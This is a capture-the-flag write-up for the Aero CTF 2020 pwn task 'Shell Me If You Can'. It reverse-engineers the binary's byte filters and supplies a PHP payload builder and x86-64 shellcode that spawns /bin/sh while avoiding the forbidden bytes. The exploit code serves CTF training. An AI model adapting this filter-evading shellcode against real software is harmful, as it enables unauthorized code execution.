# Shell Me If You Can - Aero CTF 2020 (pwn, 205, 44 solved)
## Introduction

Shell Me If You Can is a pwn/reverse task.

An archive containing a binary, a libc and its corresponding loader (`ld.so`).

The description says that firewalls can detect shellcodes. It hints that this
task is a shellcoding task, and that its goal is to bypass filters that would
block a shellcode.

The binary waits for user input and crashes afterward.

## Reverse engineering

The `main` function allocates an RWX page with `mmap` and a buffer of size
`0x80` with `calloc`. It then fills the buffer with user input.

A first function is called on this input. It xors the whole buffer with the last
byte of the buffer:
```c
xorKey = buffer[0x7F];
for(i = 0; i < 0x80; i++)
	buffer[i] ^= xorKey;
```

The buffer is then copied to the RWX mapping.

The program allocates a second buffer of size `0x80` and fills it with user
input again. Then it checks its length. If its length at least 12, it passes it
to a function ; otherwise it calls it with `R97S12-18L40C30`.
```c
if(strlen(buffer) < 12)
	f(map, "R97S12-18L40C30", 0x80);
else
	f(map, buffer, 0x80);
```

This function performs a bunch of checks and ends up jumping the map that
contains the first user input.

The function reads instructions from the second argument. The instructions it
accepts are :

1. `Rn`: replaces every bytes inferior or equal to `n` with `0x90` (`n >= 8`)
2. `Snn-mm`: substitutes every bytes equal to `nn` with `mm` (`nn != mm`,
   `nn < 0x80`, `mm < 0x80`)
3. `Ln` Replaces the last `n` bytes with `0x90` (`n <= 0x80`)
4. `Cn` Jumps to the byte `n` of the map


Every instructions must be present. The least constraining set of parameters
are : `R08S08-09L99C10`. It will execute a shellcode padded with 10 (decimal)
bytes, of size 89 (`99 - 10`) that contains no bytes inferior or equal to 8.

The problem that arises with these restrictions are:
1. `0x00` which is used as `/bin/sh`'s terminator
2. `0x05` which is used to encode `syscall` (`0f 05`)

Both restrictions can be bypassed creating values on the fly and pushing them on
the stack.

**Flag**: `Aero{dad088ac762b071665d321c2aa22c5f84f66dca4e8865da998666d15b3ca0e0a}`

## Appendices

### pwn.php
```php
#!/usr/bin/php
<?php
$shellcode = str_repeat("\x90", 10) . file_get_contents("shellcode");
echo str_pad($shellcode, 0x80, "\x00");
echo "R08"
   . "S08-09"
   . "L99"
   . "C10";
```

### shellcode.S
```assembler
#include <sys/syscall.h>

.intel_syntax noprefix
.global _start
_start:
	// push /bin/sh
	mov rbx, ~0x68732f6e69622F
	not rbx
	push rbx
	mov rdi, rsp

	// put syscall (0f 05) on the map
	mov bx, ~0x050F
	not bx

	mov word ptr [rax], bx
	mov rbx, rax

	// call execve
	xor esi, esi
	xor edx, edx
	xor eax, eax
	mov al, SYS_execve

	jmp rbx
	int3
```
